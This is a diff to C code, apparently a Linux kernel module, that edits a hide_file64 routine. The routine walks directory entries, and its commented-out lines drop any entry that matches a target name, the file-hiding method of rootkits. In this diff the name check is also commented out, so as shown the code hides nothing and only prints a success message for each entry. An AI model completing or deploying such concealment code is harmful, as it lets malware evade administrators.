@@ -78,12 +78,14 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
 {
     struct linux_dirent64 *dp;
     long cur_addr, cur_reclen;
+    char *ptr;
     unsigned long size, next_addr;
 
     for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
-        dp = (struct linux_dirent64 *)((unsigned long)dirp + cur_addr);
+        ptr = (char *)dirp + cur_addr;
+        dp = (struct linux_dirent64 *)ptr;
         
-        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
+//        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
 //            cur_reclen = dp->d_reclen;                              // Store the current length
 //            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
 //            size = (unsigned long)dirp + count - next_addr;        // Remain size = initial+size-next size
@@ -92,7 +94,7 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
 //            count -= cur_reclen;                                     // Modify the size
             
               printk("Hide %s success.\n", dp->d_name);
-        }
+//        }
     }
 
     return count;
